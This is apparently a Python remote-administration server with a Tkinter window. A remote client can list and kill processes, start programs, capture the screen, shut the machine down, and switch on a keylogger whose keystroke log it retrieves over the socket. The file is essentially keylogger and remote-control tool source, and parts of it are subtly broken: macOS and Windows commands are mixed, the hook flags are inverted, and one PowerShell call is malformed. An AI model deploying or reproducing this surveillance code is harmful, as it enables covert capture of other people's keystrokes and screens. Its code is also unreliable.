import os
import socket
import threading
import subprocess
import time
from tkinter import *
from tkinter import messagebox
from pynput import keyboard
from pynput.keyboard import Key

class Server:
    def __init__(self):
        self.window = Tk()
        self.window.title("Server")
        self.ip_label = Label(self.window, text="SERVER IP: ")
        self.toggle_button = Button(self.window, text="Toggle Server", command=self.toggle_server)
        self.ip_label.pack()
        self.toggle_button.pack()
        
        self.server_open = False
        self.server_socket = None
        self.client_socket = None
        self.buffer_size = 1024
        self.data_path = "data"
        self.log_path = "log.txt"
        
        self.keyboard_listener = None
        self.keylogger_active = False
        self.keylogger_hooked = False

        self.init_ui()
        
    def init_ui(self):
        self.update_ip_label()
        self.window.mainloop()

    def update_ip_label(self):
        try:
            ip = socket.gethostbyname(socket.gethostname())
            self.ip_label.config(text="SERVER IP: " + ip)
        except Exception:
            self.ip_label.config(text="SERVER IP: Not found!")

    def toggle_server(self):
        if not self.server_open:
            self.start_server()
        else:
            self.stop_server()

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(("0.0.0.0", 80))
            self.server_socket.listen(1)
            messagebox.showinfo("Information", "Server started successfully!")
            self.server_open = True
            self.client_socket, addr = self.server_socket.accept()
            self.handle_client()
        except Exception as e:
            messagebox.showwarning("Error", str(e))
            if self.server_socket:
                self.server_socket.close()
            self.server_open = False

    def stop_server(self):
        try:
            if self.keylogger_active:
                self.toggle_keylogger()
            if self.server_socket:
                self.server_socket.close()
            if self.client_socket:
                self.client_socket.close()
            messagebox.showinfo("Information", "Server stopped.")
            self.server_open = False
        except Exception as e:
            messagebox.showwarning("Error", str(e))
            self.server_open = False

    def send_message(self, message):
        try:
            self.client_socket.sendall(message.encode())
        except Exception:
            pass

    def recv_message(self):
        try:
            data = b""
            while True:
                chunk = self.client_socket.recv(self.buffer_size)
                if not chunk:
                    break
                data += chunk
                if b"End message" in data:
                    break
            return data.decode()
        except Exception:
            return ""

    def send_file(self, filename):
        try:
            with open(filename, "rb") as file:
                while True:
                    chunk = file.read(self.buffer_size)
                    if not chunk:
                        break
                    self.client_socket.sendall(chunk)
        except Exception:
            pass

    def handle_client(self):
        while self.server_open:
            message = self.recv_message()
            if message == "PROCESS":
                process_list = self.get_process_list()
                self.send_message(process_list)
                while True:
                    action = self.recv_message()
                    value = self.recv_message()
                    if action == "Exit":
                        break
                    elif action == "Kill":
                        is_killed = self.kill_process(value)
                        self.send_message(is_killed)
                        process_list_updated = self.get_process_list()
                        self.send_message(process_list_updated)
                    elif action == "Start":
                        is_started = self.start_application(value)
                        self.send_message(is_started)
                        process_list_updated = self.get_process_list()
                        self.send_message(process_list_updated)
            elif message == "APP":
                application_list = self.get_application_list()
                self.send_message(application_list)
                while True:
                    action = self.recv_message()
                    value = self.recv_message()
                    if action == "Exit":
                        break
                    elif action == "Kill":
                        is_killed = self.kill_application(value)
                        self.send_message(is_killed)
                        application_list_updated = self.get_application_list()
                        self.send_message(application_list_updated)
                    elif action == "Start":
                        is_started = self.start_application(value)
                        self.send_message(is_started)
                        application_list_updated = self.get_application_list()
                        self.send_message(application_list_updated)
            elif message == "KEYLOGGER":
                self.toggle_keylogger()
                while True:
                    request = self.recv_message()
                    if request == "HOOK":
                        self.keylogger_hooked = False
                        try:
                            with open(self.log_path, "w") as log_file:
                                log_file.write("")
                        except Exception:
                            pass
                    elif request == "UNHOOK":
                        self.keylogger_hooked = True
                    elif request == "PRINT":
                        if not self.keylogger_hooked:
                            log_contents = self.read_log_file()
                            self.send_message(log_contents)
                            try:
                                with open(self.log_path, "w") as log_file:
                                    log_file.write("")
                            except Exception:
                                pass
                        else:
                            self.send_message("\0")
                    elif request == "DELETE":
                        pass
                    elif request == "EXIT":
                        break
            elif message == "CAPTURE":
                self.capture_screen()
                self.send_file("captureScreen.png")
            elif message == "SHUTDOWN":
                self.turn_off()
            elif message == "OUT":
                self.client_socket.close()
                self.server_socket.close()
                self.server_open = False
                self.keylogger_hooked = False
                if self.keylogger_active:
                    self.toggle_keylogger()
                break

    def get_process_list(self):
        try:
            process_list = subprocess.check_output(["powershell.exe", "gps | select ProcessName,Id,Description"], shell=True)
            return process_list.decode()
        except Exception:
            return ""

    def kill_process(self, pid):
        try:
            subprocess.run(["taskkill", "/F", "/PID", pid], check=True)
            return "Success"
        except Exception:
            return "Fail"

    def start_application(self, application_name):
        try:
            subprocess.run(["powershell.exe", "gps | Start-Process", application_name], check=True)
            return "Success"
        except Exception:
            return "Fail"

    def get_application_list(self):
        try:
            application_list = subprocess.check_output(["powershell.exe", "gps | where {$_.MainWindowTitle } | select ProcessName,Id,Description"], shell=True)
            return application_list.decode()
        except Exception:
            return ""

    def kill_application(self, pid):
        try:
            subprocess.run(["taskkill", "/F", "/PID", pid], check=True)
            return "Success"
        except Exception:
            return "Fail"

    def toggle_keylogger(self):
        if not self.keylogger_active:
            self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
            self.keyboard_listener.start()
            self.keylogger_active = True
        else:
            if self.keyboard_listener:
                self.keyboard_listener.stop()
                self.keylogger_active = False

    def on_key_press(self, key):
        try:
            key_text = self.get_key_text(key)
            if key_text:
                self.append_to_log(key_text)
        except AttributeError:
            pass

    def get_key_text(self, key):
        if isinstance(key, keyboard.KeyCode):
            return key.char
        elif key in Key.__members__.values():
            return "[" + key.name + "]"
        return ""

    def append_to_log(self, text):
        try:
            with open(self.log_path, "a") as log_file:
                log_file.write(text)
        except Exception:
            pass

    def read_log_file(self):
        try:
            with open(self.log_path, "r") as log_file:
                log_contents = log_file.read()
            return log_contents
        except Exception:
            return ""

    def capture_screen(self):
        try:
            os.system("screencapture -R0,0,1920,1080 captureScreen.png")
        except Exception:
            pass

    def turn_off(self):
        try:
            os.system("shutdown -s -t 1")
        except Exception:
            pass

if __name__ == "__main__":
    Server()
